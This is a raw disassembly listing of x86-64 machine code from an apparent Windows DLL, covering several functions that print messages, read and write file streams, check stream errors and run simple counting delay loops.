   18000340e:	8d 51 e0             	lea    -0x20(%rcx),%edx
   180003411:	89 94 31 44 ff ff ff 	mov    %edx,-0xbc(%rcx,%rsi,1)
   180003418:	48 8b 86 58 ff ff ff 	mov    -0xa8(%rsi),%rax
   18000341f:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003423:	48 8d 05 2e e2 03 00 	lea    0x3e22e(%rip),%rax        # 0x180041658
   18000342a:	48 89 84 31 58 ff ff 	mov    %rax,-0xa8(%rcx,%rsi,1)
   180003431:	ff 
   180003432:	48 8b 86 58 ff ff ff 	mov    -0xa8(%rsi),%rax
   180003439:	48 63 48 04          	movslq 0x4(%rax),%rcx
   18000343d:	8d 51 f0             	lea    -0x10(%rcx),%edx
   180003440:	89 94 31 54 ff ff ff 	mov    %edx,-0xac(%rcx,%rsi,1)
   180003447:	48 8b 07             	mov    (%rdi),%rax
   18000344a:	48 63 50 04          	movslq 0x4(%rax),%rdx
   18000344e:	48 8d 05 6b e2 03 00 	lea    0x3e26b(%rip),%rax        # 0x1800416c0
   180003455:	48 89 84 32 48 ff ff 	mov    %rax,-0xb8(%rdx,%rsi,1)
   18000345c:	ff 
   18000345d:	48 8b 07             	mov    (%rdi),%rax
   180003460:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180003464:	44 8d 42 e8          	lea    -0x18(%rdx),%r8d
   180003468:	44 89 84 32 44 ff ff 	mov    %r8d,-0xbc(%rdx,%rsi,1)
   18000346f:	ff 
   180003470:	48 8d 05 c1 e0 03 00 	lea    0x3e0c1(%rip),%rax        # 0x180041538
   180003477:	48 89 06             	mov    %rax,(%rsi)
   18000347a:	48 8b ce             	mov    %rsi,%rcx
   18000347d:	e8 6e 39 01 00       	call   0x180016df0
   180003482:	90                   	nop
   180003483:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003488:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000348d:	48 83 c4 20          	add    $0x20,%rsp
   180003491:	5f                   	pop    %rdi
   180003492:	c3                   	ret
   180003493:	cc                   	int3
   180003494:	cc                   	int3
   180003495:	cc                   	int3
   180003496:	cc                   	int3
   180003497:	cc                   	int3
   180003498:	cc                   	int3
   180003499:	cc                   	int3
   18000349a:	cc                   	int3
   18000349b:	cc                   	int3
   18000349c:	cc                   	int3
   18000349d:	cc                   	int3
   18000349e:	cc                   	int3
   18000349f:	cc                   	int3
   1800034a0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800034a5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800034aa:	55                   	push   %rbp
   1800034ab:	57                   	push   %rdi
   1800034ac:	41 56                	push   %r14
   1800034ae:	48 8d ac 24 60 fe ff 	lea    -0x1a0(%rsp),%rbp
   1800034b5:	ff 
   1800034b6:	48 81 ec a0 02 00 00 	sub    $0x2a0,%rsp
   1800034bd:	48 8b 05 94 3b 05 00 	mov    0x53b94(%rip),%rax        # 0x180057058
   1800034c4:	48 33 c4             	xor    %rsp,%rax
   1800034c7:	48 89 85 90 01 00 00 	mov    %rax,0x190(%rbp)
   1800034ce:	8b da                	mov    %edx,%ebx
   1800034d0:	48 8b f9             	mov    %rcx,%rdi
   1800034d3:	48 8d 15 3e be 04 00 	lea    0x4be3e(%rip),%rdx        # 0x18004f318
   1800034da:	48 8d 0d 0f 52 05 00 	lea    0x5520f(%rip),%rcx        # 0x1800586f0
   1800034e1:	e8 1a be 00 00       	call   0x18000f300
   1800034e6:	48 8d 15 bb bd 04 00 	lea    0x4bdbb(%rip),%rdx        # 0x18004f2a8
   1800034ed:	48 8d 0d fc 51 05 00 	lea    0x551fc(%rip),%rcx        # 0x1800586f0
   1800034f4:	e8 07 be 00 00       	call   0x18000f300
   1800034f9:	48 8d 15 30 be 04 00 	lea    0x4be30(%rip),%rdx        # 0x18004f330
   180003500:	48 8d 0d e9 51 05 00 	lea    0x551e9(%rip),%rcx        # 0x1800586f0
   180003507:	e8 f4 bd 00 00       	call   0x18000f300
   18000350c:	48 8d 15 35 be 04 00 	lea    0x4be35(%rip),%rdx        # 0x18004f348
   180003513:	48 8d 0d d6 51 05 00 	lea    0x551d6(%rip),%rcx        # 0x1800586f0
   18000351a:	e8 e1 bd 00 00       	call   0x18000f300
   18000351f:	48 8d 15 0a be 04 00 	lea    0x4be0a(%rip),%rdx        # 0x18004f330
   180003526:	48 8d 0d c3 51 05 00 	lea    0x551c3(%rip),%rcx        # 0x1800586f0
   18000352d:	e8 ce bd 00 00       	call   0x18000f300
   180003532:	48 8d 15 df bd 04 00 	lea    0x4bddf(%rip),%rdx        # 0x18004f318
   180003539:	48 8d 0d b0 51 05 00 	lea    0x551b0(%rip),%rcx        # 0x1800586f0
   180003540:	e8 bb bd 00 00       	call   0x18000f300
   180003545:	48 8d 15 5c bd 04 00 	lea    0x4bd5c(%rip),%rdx        # 0x18004f2a8
   18000354c:	48 8d 0d 9d 51 05 00 	lea    0x5519d(%rip),%rcx        # 0x1800586f0
   180003553:	e8 a8 bd 00 00       	call   0x18000f300
   180003558:	33 f6                	xor    %esi,%esi
   18000355a:	33 d2                	xor    %edx,%edx
   18000355c:	41 b8 10 01 00 00    	mov    $0x110,%r8d
   180003562:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180003567:	e8 e4 69 01 00       	call   0x180019f50
   18000356c:	48 8d 15 35 bf 04 00 	lea    0x4bf35(%rip),%rdx        # 0x18004f4a8
   180003573:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180003578:	e8 43 66 00 00       	call   0x180009bc0
   18000357d:	90                   	nop
   18000357e:	33 d2                	xor    %edx,%edx
   180003580:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   180003586:	48 8d 8d 80 00 00 00 	lea    0x80(%rbp),%rcx
   18000358d:	e8 be 69 01 00       	call   0x180019f50
   180003592:	41 be 02 00 00 00    	mov    $0x2,%r14d
   180003598:	45 8b c6             	mov    %r14d,%r8d
   18000359b:	48 8d 15 16 c3 04 00 	lea    0x4c316(%rip),%rdx        # 0x18004f8b8
   1800035a2:	48 8d 8d 80 00 00 00 	lea    0x80(%rbp),%rcx
   1800035a9:	e8 02 77 00 00       	call   0x18000acb0
   1800035ae:	90                   	nop
   1800035af:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1800035b4:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800035b8:	f6 44 0d 80 01       	testb  $0x1,-0x80(%rbp,%rcx,1)
   1800035bd:	0f 85 08 01 00 00    	jne    0x1800036cb
   1800035c3:	48 8b d7             	mov    %rdi,%rdx
   1800035c6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800035cb:	e8 30 7b 00 00       	call   0x18000b100
   1800035d0:	39 1f                	cmp    %ebx,(%rdi)
   1800035d2:	74 24                	je     0x1800035f8
   1800035d4:	48 8b d7             	mov    %rdi,%rdx
   1800035d7:	48 8d 8d 80 00 00 00 	lea    0x80(%rbp),%rcx
   1800035de:	e8 6d 7e 00 00       	call   0x18000b450
   1800035e3:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1800035e8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800035ec:	f6 44 0d 80 01       	testb  $0x1,-0x80(%rbp,%rcx,1)
   1800035f1:	74 d0                	je     0x1800035c3
   1800035f3:	e9 d3 00 00 00       	jmp    0x1800036cb
   1800035f8:	48 8d 15 01 c0 04 00 	lea    0x4c001(%rip),%rdx        # 0x18004f600
   1800035ff:	48 8d 0d ea 50 05 00 	lea    0x550ea(%rip),%rcx        # 0x1800586f0
   180003606:	e8 f5 bc 00 00       	call   0x18000f300
   18000360b:	48 8b c8             	mov    %rax,%rcx
   18000360e:	48 8d 57 04          	lea    0x4(%rdi),%rdx
   180003612:	e8 e9 bc 00 00       	call   0x18000f300
   180003617:	48 8d 15 f2 bf 04 00 	lea    0x4bff2(%rip),%rdx        # 0x18004f610
   18000361e:	48 8d 0d cb 50 05 00 	lea    0x550cb(%rip),%rcx        # 0x1800586f0
   180003625:	e8 d6 bc 00 00       	call   0x18000f300
   18000362a:	48 8b c8             	mov    %rax,%rcx
   18000362d:	48 8d 57 22          	lea    0x22(%rdi),%rdx
   180003631:	e8 ca bc 00 00       	call   0x18000f300
   180003636:	48 8d 15 8b c2 04 00 	lea    0x4c28b(%rip),%rdx        # 0x18004f8c8
   18000363d:	48 8d 0d ac 50 05 00 	lea    0x550ac(%rip),%rcx        # 0x1800586f0
   180003644:	e8 b7 bc 00 00       	call   0x18000f300
   180003649:	48 8b c8             	mov    %rax,%rcx
   18000364c:	48 8d 57 54          	lea    0x54(%rdi),%rdx
   180003650:	e8 ab bc 00 00       	call   0x18000f300
   180003655:	48 8d 15 d4 bf 04 00 	lea    0x4bfd4(%rip),%rdx        # 0x18004f630
   18000365c:	48 8d 0d 8d 50 05 00 	lea    0x5508d(%rip),%rcx        # 0x1800586f0
   180003663:	e8 98 bc 00 00       	call   0x18000f300
   180003668:	48 8b c8             	mov    %rax,%rcx
   18000366b:	8b 57 64             	mov    0x64(%rdi),%edx
   18000366e:	e8 7d 81 00 00       	call   0x18000b7f0
   180003673:	48 8d 15 c6 bf 04 00 	lea    0x4bfc6(%rip),%rdx        # 0x18004f640
   18000367a:	48 8d 0d 6f 50 05 00 	lea    0x5506f(%rip),%rcx        # 0x1800586f0
   180003681:	e8 7a bc 00 00       	call   0x18000f300
   180003686:	48 8b c8             	mov    %rax,%rcx
   180003689:	f3 0f 10 4f 68       	movss  0x68(%rdi),%xmm1
   18000368e:	e8 3d 7f 00 00       	call   0x18000b5d0
   180003693:	48 8d 15 3e c2 04 00 	lea    0x4c23e(%rip),%rdx        # 0x18004f8d8
   18000369a:	48 8d 0d 4f 50 05 00 	lea    0x5504f(%rip),%rcx        # 0x1800586f0
   1800036a1:	e8 5a bc 00 00       	call   0x18000f300
   1800036a6:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1800036ab:	e8 00 bf 00 00       	call   0x18000f5b0
   1800036b0:	80 7c 24 30 6e       	cmpb   $0x6e,0x30(%rsp)
   1800036b5:	75 0f                	jne    0x1800036c6
   1800036b7:	48 8b d7             	mov    %rdi,%rdx
   1800036ba:	48 8d 8d 80 00 00 00 	lea    0x80(%rbp),%rcx
   1800036c1:	e8 8a 7d 00 00       	call   0x18000b450
   1800036c6:	be 01 00 00 00       	mov    $0x1,%esi
   1800036cb:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1800036cf:	e8 1c 9b 00 00       	call   0x18000d1f0
   1800036d4:	bb 06 00 00 00       	mov    $0x6,%ebx
   1800036d9:	48 85 c0             	test   %rax,%rax
   1800036dc:	75 2c                	jne    0x18000370a
   1800036de:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1800036e3:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800036e7:	8b c3                	mov    %ebx,%eax
   1800036e9:	48 83 7c 0d b8 00    	cmpq   $0x0,-0x48(%rbp,%rcx,1)
   1800036ef:	41 0f 45 c6          	cmovne %r14d,%eax
   1800036f3:	0b 44 0d 80          	or     -0x80(%rbp,%rcx,1),%eax
   1800036f7:	83 e0 17             	and    $0x17,%eax
   1800036fa:	89 44 0d 80          	mov    %eax,-0x80(%rbp,%rcx,1)
   1800036fe:	8b 54 0d 84          	mov    -0x7c(%rbp,%rcx,1),%edx
   180003702:	23 d0                	and    %eax,%edx
   180003704:	0f 85 e1 01 00 00    	jne    0x1800038eb
   18000370a:	48 8d 8d 88 00 00 00 	lea    0x88(%rbp),%rcx
   180003711:	e8 da 9a 00 00       	call   0x18000d1f0
   180003716:	48 85 c0             	test   %rax,%rax
   180003719:	75 38                	jne    0x180003753
   18000371b:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   180003722:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003726:	48 83 bc 0d c8 00 00 	cmpq   $0x0,0xc8(%rbp,%rcx,1)
   18000372d:	00 00 
   18000372f:	41 0f 45 de          	cmovne %r14d,%ebx
   180003733:	0b 9c 0d 90 00 00 00 	or     0x90(%rbp,%rcx,1),%ebx
   18000373a:	83 e3 17             	and    $0x17,%ebx
   18000373d:	89 9c 0d 90 00 00 00 	mov    %ebx,0x90(%rbp,%rcx,1)
   180003744:	8b 84 0d 94 00 00 00 	mov    0x94(%rbp,%rcx,1),%eax
   18000374b:	23 c3                	and    %ebx,%eax
   18000374d:	0f 85 46 01 00 00    	jne    0x180003899
   180003753:	85 f6                	test   %esi,%esi
   180003755:	75 15                	jne    0x18000376c
   180003757:	48 8d 15 aa c1 04 00 	lea    0x4c1aa(%rip),%rdx        # 0x18004f908
   18000375e:	48 8d 0d 8b 4f 05 00 	lea    0x54f8b(%rip),%rcx        # 0x1800586f0
   180003765:	e8 96 bb 00 00       	call   0x18000f300
   18000376a:	eb 20                	jmp    0x18000378c
   18000376c:	48 8d 0d 35 bd 04 00 	lea    0x4bd35(%rip),%rcx        # 0x18004f4a8
   180003773:	e8 d8 10 02 00       	call   0x180024850
   180003778:	48 8d 15 29 bd 04 00 	lea    0x4bd29(%rip),%rdx        # 0x18004f4a8
   18000377f:	48 8d 0d 32 c1 04 00 	lea    0x4c132(%rip),%rcx        # 0x18004f8b8
   180003786:	e8 a5 11 02 00       	call   0x180024930
   18000378b:	90                   	nop
   18000378c:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   180003793:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003797:	48 8d 05 ca c5 04 00 	lea    0x4c5ca(%rip),%rax        # 0x18004fd68
   18000379e:	48 89 84 0d 80 00 00 	mov    %rax,0x80(%rbp,%rcx,1)
   1800037a5:	00 
   1800037a6:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   1800037ad:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800037b1:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   1800037b7:	89 54 0d 7c          	mov    %edx,0x7c(%rbp,%rcx,1)
   1800037bb:	48 8d 8d 88 00 00 00 	lea    0x88(%rbp),%rcx
   1800037c2:	e8 29 72 00 00       	call   0x18000a9f0
   1800037c7:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   1800037ce:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800037d2:	48 8d 05 7f de 03 00 	lea    0x3de7f(%rip),%rax        # 0x180041658
   1800037d9:	48 89 84 0d 80 00 00 	mov    %rax,0x80(%rbp,%rcx,1)
   1800037e0:	00 
   1800037e1:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   1800037e8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800037ec:	8d 51 f0             	lea    -0x10(%rcx),%edx
   1800037ef:	89 54 0d 7c          	mov    %edx,0x7c(%rbp,%rcx,1)
   1800037f3:	48 8d 1d 3e dd 03 00 	lea    0x3dd3e(%rip),%rbx        # 0x180041538
   1800037fa:	48 89 9d 28 01 00 00 	mov    %rbx,0x128(%rbp)
   180003801:	48 8d 8d 28 01 00 00 	lea    0x128(%rbp),%rcx
   180003808:	e8 e3 35 01 00       	call   0x180016df0
   18000380d:	90                   	nop
   18000380e:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180003813:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003817:	48 8d 05 62 c5 04 00 	lea    0x4c562(%rip),%rax        # 0x18004fd80
   18000381e:	48 89 44 0c 70       	mov    %rax,0x70(%rsp,%rcx,1)
   180003823:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180003828:	48 63 48 04          	movslq 0x4(%rax),%rcx
   18000382c:	8d 91 50 ff ff ff    	lea    -0xb0(%rcx),%edx
   180003832:	89 54 0c 6c          	mov    %edx,0x6c(%rsp,%rcx,1)
   180003836:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   18000383a:	e8 b1 71 00 00       	call   0x18000a9f0
   18000383f:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180003844:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180003848:	48 8d 05 71 de 03 00 	lea    0x3de71(%rip),%rax        # 0x1800416c0
   18000384f:	48 89 44 0c 70       	mov    %rax,0x70(%rsp,%rcx,1)
   180003854:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180003859:	48 63 48 04          	movslq 0x4(%rax),%rcx
   18000385d:	8d 51 e8             	lea    -0x18(%rcx),%edx
   180003860:	89 54 0c 6c          	mov    %edx,0x6c(%rsp,%rcx,1)
   180003864:	48 89 5d 20          	mov    %rbx,0x20(%rbp)
   180003868:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   18000386c:	e8 7f 35 01 00       	call   0x180016df0
   180003871:	90                   	nop
   180003872:	48 8b 8d 90 01 00 00 	mov    0x190(%rbp),%rcx
   180003879:	48 33 cc             	xor    %rsp,%rcx
   18000387c:	e8 8f 40 01 00       	call   0x180017910
   180003881:	4c 8d 9c 24 a0 02 00 	lea    0x2a0(%rsp),%r11
   180003888:	00 
   180003889:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   18000388d:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180003891:	49 8b e3             	mov    %r11,%rsp
   180003894:	41 5e                	pop    %r14
   180003896:	5f                   	pop    %rdi
   180003897:	5d                   	pop    %rbp
   180003898:	c3                   	ret
   180003899:	a8 04                	test   $0x4,%al
   18000389b:	74 09                	je     0x1800038a6
   18000389d:	48 8d 1d 4c b9 04 00 	lea    0x4b94c(%rip),%rbx        # 0x18004f1f0
   1800038a4:	eb 14                	jmp    0x1800038ba
   1800038a6:	a8 02                	test   $0x2,%al
   1800038a8:	48 8d 1d 59 b9 04 00 	lea    0x4b959(%rip),%rbx        # 0x18004f208
   1800038af:	48 8d 05 6a b9 04 00 	lea    0x4b96a(%rip),%rax        # 0x18004f220
   1800038b6:	48 0f 44 d8          	cmove  %rax,%rbx
   1800038ba:	ba 01 00 00 00       	mov    $0x1,%edx
   1800038bf:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1800038c4:	e8 a7 dc ff ff       	call   0x180001570
   1800038c9:	4c 8b c0             	mov    %rax,%r8
   1800038cc:	48 8b d3             	mov    %rbx,%rdx
   1800038cf:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1800038d4:	e8 07 e5 ff ff       	call   0x180001de0
   1800038d9:	48 8d 15 88 20 05 00 	lea    0x52088(%rip),%rdx        # 0x180055968
   1800038e0:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1800038e5:	e8 e2 5e 01 00       	call   0x1800197cc
   1800038ea:	cc                   	int3
   1800038eb:	f6 c2 04             	test   $0x4,%dl
   1800038ee:	74 09                	je     0x1800038f9
   1800038f0:	48 8d 1d f9 b8 04 00 	lea    0x4b8f9(%rip),%rbx        # 0x18004f1f0
   1800038f7:	eb 15                	jmp    0x18000390e
   1800038f9:	f6 c2 02             	test   $0x2,%dl
   1800038fc:	48 8d 1d 05 b9 04 00 	lea    0x4b905(%rip),%rbx        # 0x18004f208
   180003903:	48 8d 05 16 b9 04 00 	lea    0x4b916(%rip),%rax        # 0x18004f220
   18000390a:	48 0f 44 d8          	cmove  %rax,%rbx
   18000390e:	ba 01 00 00 00       	mov    $0x1,%edx
   180003913:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   180003918:	e8 53 dc ff ff       	call   0x180001570
   18000391d:	4c 8b c0             	mov    %rax,%r8
   180003920:	48 8b d3             	mov    %rbx,%rdx
   180003923:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   180003928:	e8 b3 e4 ff ff       	call   0x180001de0
   18000392d:	48 8d 15 34 20 05 00 	lea    0x52034(%rip),%rdx        # 0x180055968
   180003934:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   180003939:	e8 8e 5e 01 00       	call   0x1800197cc
   18000393e:	cc                   	int3
   18000393f:	cc                   	int3
   180003940:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003945:	57                   	push   %rdi
   180003946:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   18000394d:	48 8b 05 04 37 05 00 	mov    0x53704(%rip),%rax        # 0x180057058
   180003954:	48 33 c4             	xor    %rsp,%rax
   180003957:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
   18000395e:	00 
   18000395f:	48 8d 15 ce bf 04 00 	lea    0x4bfce(%rip),%rdx        # 0x18004f934
   180003966:	48 8d 0d 83 4d 05 00 	lea    0x54d83(%rip),%rcx        # 0x1800586f0
   18000396d:	e8 8e b9 00 00       	call   0x18000f300
   180003972:	48 8d 15 bf b8 04 00 	lea    0x4b8bf(%rip),%rdx        # 0x18004f238
   180003979:	48 8d 0d 70 4d 05 00 	lea    0x54d70(%rip),%rcx        # 0x1800586f0
   180003980:	e8 7b b9 00 00       	call   0x18000f300
   180003985:	48 8d 15 bc b8 04 00 	lea    0x4b8bc(%rip),%rdx        # 0x18004f248
   18000398c:	48 8d 0d 5d 4d 05 00 	lea    0x54d5d(%rip),%rcx        # 0x1800586f0
   180003993:	e8 68 b9 00 00       	call   0x18000f300
   180003998:	48 8d 15 d9 b8 04 00 	lea    0x4b8d9(%rip),%rdx        # 0x18004f278
   18000399f:	48 8d 0d 4a 4d 05 00 	lea    0x54d4a(%rip),%rcx        # 0x1800586f0
   1800039a6:	e8 55 b9 00 00       	call   0x18000f300
   1800039ab:	48 8d 15 de b8 04 00 	lea    0x4b8de(%rip),%rdx        # 0x18004f290
   1800039b2:	48 8d 0d 37 4d 05 00 	lea    0x54d37(%rip),%rcx        # 0x1800586f0
   1800039b9:	e8 42 b9 00 00       	call   0x18000f300
   1800039be:	48 8d 15 e3 b8 04 00 	lea    0x4b8e3(%rip),%rdx        # 0x18004f2a8
   1800039c5:	48 8d 0d 24 4d 05 00 	lea    0x54d24(%rip),%rcx        # 0x1800586f0
   1800039cc:	e8 2f b9 00 00       	call   0x18000f300
   1800039d1:	48 8d 15 e8 b8 04 00 	lea    0x4b8e8(%rip),%rdx        # 0x18004f2c0
   1800039d8:	48 8d 0d 11 4d 05 00 	lea    0x54d11(%rip),%rcx        # 0x1800586f0
   1800039df:	e8 1c b9 00 00       	call   0x18000f300
   1800039e4:	48 8d 15 d5 b8 04 00 	lea    0x4b8d5(%rip),%rdx        # 0x18004f2c0
   1800039eb:	48 8d 0d fe 4c 05 00 	lea    0x54cfe(%rip),%rcx        # 0x1800586f0
   1800039f2:	e8 09 b9 00 00       	call   0x18000f300
   1800039f7:	48 8d 15 da b8 04 00 	lea    0x4b8da(%rip),%rdx        # 0x18004f2d8
   1800039fe:	48 8d 0d eb 4c 05 00 	lea    0x54ceb(%rip),%rcx        # 0x1800586f0
   180003a05:	e8 f6 b8 00 00       	call   0x18000f300
   180003a0a:	48 8d 15 af b8 04 00 	lea    0x4b8af(%rip),%rdx        # 0x18004f2c0
   180003a11:	48 8d 0d d8 4c 05 00 	lea    0x54cd8(%rip),%rcx        # 0x1800586f0
   180003a18:	e8 e3 b8 00 00       	call   0x18000f300
   180003a1d:	48 8d 15 dc b8 04 00 	lea    0x4b8dc(%rip),%rdx        # 0x18004f300
   180003a24:	48 8d 0d c5 4c 05 00 	lea    0x54cc5(%rip),%rcx        # 0x1800586f0
   180003a2b:	e8 d0 b8 00 00       	call   0x18000f300
   180003a30:	48 8d 15 e1 b8 04 00 	lea    0x4b8e1(%rip),%rdx        # 0x18004f318
   180003a37:	48 8d 0d b2 4c 05 00 	lea    0x54cb2(%rip),%rcx        # 0x1800586f0
   180003a3e:	e8 bd b8 00 00       	call   0x18000f300
   180003a43:	48 8d 15 5e b8 04 00 	lea    0x4b85e(%rip),%rdx        # 0x18004f2a8
   180003a4a:	48 8d 0d 9f 4c 05 00 	lea    0x54c9f(%rip),%rcx        # 0x1800586f0
   180003a51:	e8 aa b8 00 00       	call   0x18000f300
   180003a56:	48 8d 15 13 b9 04 00 	lea    0x4b913(%rip),%rdx        # 0x18004f370
   180003a5d:	48 8d 0d 8c 4c 05 00 	lea    0x54c8c(%rip),%rcx        # 0x1800586f0
   180003a64:	e8 97 b8 00 00       	call   0x18000f300
   180003a69:	bf 0a 00 00 00       	mov    $0xa,%edi
   180003a6e:	8b df                	mov    %edi,%ebx
   180003a70:	b8 05 00 00 00       	mov    $0x5,%eax
   180003a75:	48 3d 9f 86 01 00    	cmp    $0x1869f,%rax
   180003a7b:	74 0b                	je     0x180003a88
   180003a7d:	48 ff c0             	inc    %rax
   180003a80:	48 83 f8 04          	cmp    $0x4,%rax
   180003a84:	7f ef                	jg     0x180003a75
   180003a86:	eb 13                	jmp    0x180003a9b
   180003a88:	48 8d 15 0d b9 04 00 	lea    0x4b90d(%rip),%rdx        # 0x18004f39c
   180003a8f:	48 8d 0d 5a 4c 05 00 	lea    0x54c5a(%rip),%rcx        # 0x1800586f0
   180003a96:	e8 65 b8 00 00       	call   0x18000f300
   180003a9b:	48 83 eb 01          	sub    $0x1,%rbx
   180003a9f:	75 cf                	jne    0x180003a70
   180003aa1:	48 8d 15 90 be 04 00 	lea    0x4be90(%rip),%rdx        # 0x18004f938
   180003aa8:	48 8d 0d 41 4c 05 00 	lea    0x54c41(%rip),%rcx        # 0x1800586f0
   180003aaf:	e8 4c b8 00 00       	call   0x18000f300
   180003ab4:	e8 b3 09 02 00       	call   0x18002446c
   180003ab9:	48 8d 15 58 b8 04 00 	lea    0x4b858(%rip),%rdx        # 0x18004f318
   180003ac0:	48 8d 0d 29 4c 05 00 	lea    0x54c29(%rip),%rcx        # 0x1800586f0
   180003ac7:	e8 34 b8 00 00       	call   0x18000f300
   180003acc:	48 8d 15 d5 b7 04 00 	lea    0x4b7d5(%rip),%rdx        # 0x18004f2a8
   180003ad3:	48 8d 0d 16 4c 05 00 	lea    0x54c16(%rip),%rcx        # 0x1800586f0
   180003ada:	e8 21 b8 00 00       	call   0x18000f300
   180003adf:	48 8d 15 4a b8 04 00 	lea    0x4b84a(%rip),%rdx        # 0x18004f330
   180003ae6:	48 8d 0d 03 4c 05 00 	lea    0x54c03(%rip),%rcx        # 0x1800586f0
   180003aed:	e8 0e b8 00 00       	call   0x18000f300
   180003af2:	48 8d 15 4f b8 04 00 	lea    0x4b84f(%rip),%rdx        # 0x18004f348
   180003af9:	48 8d 0d f0 4b 05 00 	lea    0x54bf0(%rip),%rcx        # 0x1800586f0
   180003b00:	e8 fb b7 00 00       	call   0x18000f300
   180003b05:	48 8d 15 24 b8 04 00 	lea    0x4b824(%rip),%rdx        # 0x18004f330
   180003b0c:	48 8d 0d dd 4b 05 00 	lea    0x54bdd(%rip),%rcx        # 0x1800586f0
   180003b13:	e8 e8 b7 00 00       	call   0x18000f300
   180003b18:	48 8d 15 f9 b7 04 00 	lea    0x4b7f9(%rip),%rdx        # 0x18004f318
   180003b1f:	48 8d 0d ca 4b 05 00 	lea    0x54bca(%rip),%rcx        # 0x1800586f0
   180003b26:	e8 d5 b7 00 00       	call   0x18000f300
   180003b2b:	48 8d 15 76 b7 04 00 	lea    0x4b776(%rip),%rdx        # 0x18004f2a8
   180003b32:	48 8d 0d b7 4b 05 00 	lea    0x54bb7(%rip),%rcx        # 0x1800586f0
   180003b39:	e8 c2 b7 00 00       	call   0x18000f300
   180003b3e:	48 8d 15 1b be 04 00 	lea    0x4be1b(%rip),%rdx        # 0x18004f960
   180003b45:	48 8d 0d a4 4b 05 00 	lea    0x54ba4(%rip),%rcx        # 0x1800586f0
   180003b4c:	e8 af b7 00 00       	call   0x18000f300
   180003b51:	4c 8d 84 24 90 00 00 	lea    0x90(%rsp),%r8
   180003b58:	00 
   180003b59:	e8 92 14 01 00       	call   0x180014ff0
   180003b5e:	48 8d 15 13 be 04 00 	lea    0x4be13(%rip),%rdx        # 0x18004f978
   180003b65:	48 8d 0d 84 4b 05 00 	lea    0x54b84(%rip),%rcx        # 0x1800586f0
   180003b6c:	e8 8f b7 00 00       	call   0x18000f300
   180003b71:	4c 8d 84 24 98 00 00 	lea    0x98(%rsp),%r8
   180003b78:	00 
   180003b79:	e8 72 14 01 00       	call   0x180014ff0
   180003b7e:	48 8d 15 07 be 04 00 	lea    0x4be07(%rip),%rdx        # 0x18004f98c
   180003b85:	48 8d 0d 64 4b 05 00 	lea    0x54b64(%rip),%rcx        # 0x1800586f0
   180003b8c:	e8 6f b7 00 00       	call   0x18000f300
   180003b91:	48 8d 15 d8 b7 04 00 	lea    0x4b7d8(%rip),%rdx        # 0x18004f370
   180003b98:	48 8d 0d 51 4b 05 00 	lea    0x54b51(%rip),%rcx        # 0x1800586f0
   180003b9f:	e8 5c b7 00 00       	call   0x18000f300
   180003ba4:	0f 1f 40 00          	nopl   0x0(%rax)
   180003ba8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180003baf:	00 
   180003bb0:	b8 05 00 00 00       	mov    $0x5,%eax
   180003bb5:	48 3d 9f 86 01 00    	cmp    $0x1869f,%rax
   180003bbb:	74 0b                	je     0x180003bc8
   180003bbd:	48 ff c0             	inc    %rax
   180003bc0:	48 83 f8 04          	cmp    $0x4,%rax
   180003bc4:	7f ef                	jg     0x180003bb5
   180003bc6:	eb 13                	jmp    0x180003bdb
   180003bc8:	48 8d 15 cd b7 04 00 	lea    0x4b7cd(%rip),%rdx        # 0x18004f39c
   180003bcf:	48 8d 0d 1a 4b 05 00 	lea    0x54b1a(%rip),%rcx        # 0x1800586f0
   180003bd6:	e8 25 b7 00 00       	call   0x18000f300
   180003bdb:	48 83 ef 01          	sub    $0x1,%rdi
   180003bdf:	75 cf                	jne    0x180003bb0
   180003be1:	48 8d 15 a8 bd 04 00 	lea    0x4bda8(%rip),%rdx        # 0x18004f990
